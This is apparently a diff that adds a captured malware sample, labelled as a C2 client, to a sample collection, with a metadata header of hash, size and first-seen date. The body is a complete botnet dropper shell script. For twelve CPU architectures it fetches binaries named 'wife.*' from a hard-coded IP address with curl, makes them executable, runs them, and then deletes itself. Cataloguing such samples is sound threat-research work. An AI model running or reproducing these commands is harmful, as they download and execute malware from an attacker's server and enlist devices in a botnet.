@@ -1,0 +1,23 @@
+# sha256: 33593ca7f958d9e868abfd092707396f4b99f547b4e91c6b4d26b1e8b33ef5ca
+# family: c2_client
+# kind: script
+# size_bytes: 958
+# first_seen: 2026-09-15 08:00:26.680000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+curl http://176.65.139.251/wife.arm; chmod 777 wife.arm; ./wife.arm android
+curl http://176.65.139.251/wife.arm5; chmod 777 wife.arm5; ./wife.arm5 android
+curl http://176.65.139.251/wife.arm6; chmod 777 wife.arm6; ./wife.arm6 android
+curl http://176.65.139.251/wife.arm7; chmod 777 wife.arm7; ./wife.arm7 android
+curl http://176.65.139.251/wife.m68k; chmod 777 wife.m68k; ./wife.m68k android
+curl http://176.65.139.251/wife.mips; chmod 777 wife.mips; ./wife.mips android
+curl http://176.65.139.251/wife.mpsl; chmod 777 wife.mpsl; ./wife.mpsl android
+curl http://176.65.139.251/wife.ppc; chmod 777 wife.ppc; ./wife.ppc android
+curl http://176.65.139.251/wife.sh4; chmod 777 wife.sh4; ./wife.sh4 android
+curl http://176.65.139.251/wife.spc; chmod 777 wife.spc; ./wife.spc android
+curl http://176.65.139.251/wife.x86; chmod 777 wife.x86; ./wife.x86 android
+curl http://176.65.139.251/wife.x86_64; chmod 777 wife.x86_64; ./wife.x86_64 android
+
+rm $0
